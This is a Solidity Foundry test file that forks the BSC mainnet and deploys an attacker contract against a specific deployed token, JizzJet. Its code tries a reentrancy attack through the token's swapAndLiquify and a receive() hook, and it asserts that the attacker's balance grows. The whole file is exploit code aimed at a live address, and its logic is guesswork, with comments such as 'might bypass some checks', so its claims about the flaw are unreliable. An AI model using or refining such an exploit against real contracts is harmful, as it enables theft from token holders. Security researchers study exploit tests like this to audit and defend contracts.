// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapAndLiquify(uint256 contractTokenBalance) external;
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

contract AttackerContract {
    IJizzJet public target;
    uint256 public reentrancyCount = 0;
    bool public attacking = false;

    constructor() {
        target = IJizzJet(0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2);
    }

    function startAttack() external {
        // First, transfer tokens to the target contract to increase its balance
        // Need to trigger swapAndLiquify by making contract balance >= numTokensSellToAddToLiquidity
        uint256 triggerAmount = 100_000_000 * 10**18; // Adjust based on actual threshold
        target.transfer(address(target), triggerAmount);

        // Now trigger swapAndLiquify by transferring from a non-pair address
        attacking = true;
        // This transfer should trigger swapAndLiquify if conditions are met
        target.transfer(address(this), 1);
    }

    receive() external payable {
        if (attacking && reentrancyCount < 10) {
            reentrancyCount++;

            // Reentrant call - try to transfer more tokens while inSwapAndLiquify is true
            // This might bypass some checks or fees
            target.transfer(address(this), 1);

            // Or try to call other functions that might be vulnerable during reentrancy
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attackerContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("bsc"));

        // Create malicious contract that will perform reentrancy
        attackerContract = address(new AttackerContract());

        // Give attacker some native tokens for gas
        deal(attackerContract, 10 ether);

        // Get some JizzJet tokens for the attacker contract
        deal(TARGET, attackerContract, 100_000_000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(attackerContract).balance;

        // Start the attack from the attacker contract
        vm.prank(attackerContract);
        (bool success, ) = attackerContract.call(abi.encodeWithSignature("startAttack()"));
        require(success, "Attack failed");

        // Check if attacker's balance increased
        uint256 finalBalance = address(attackerContract).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

